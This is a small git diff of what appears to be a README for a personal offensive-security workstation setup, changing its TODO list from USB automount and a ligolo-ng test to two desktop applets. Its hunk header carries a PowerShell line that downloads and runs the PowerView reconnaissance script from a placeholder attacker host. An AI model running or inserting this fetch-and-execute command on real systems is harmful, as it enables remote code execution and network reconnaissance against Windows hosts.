@@ -65,8 +65,8 @@ IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 ## TODOs
 
 - script to patch .local/share/navi/cheats
-- [OPTIONAL] automount usb
-- test pipewire ligolo-ng
+- [BAREMETAL] network manager applet
+- [BAREMETAL] calendar applet
 
 ## Checkout
 Below are things I will get around to trying and will add them to the install script if I find them useful.
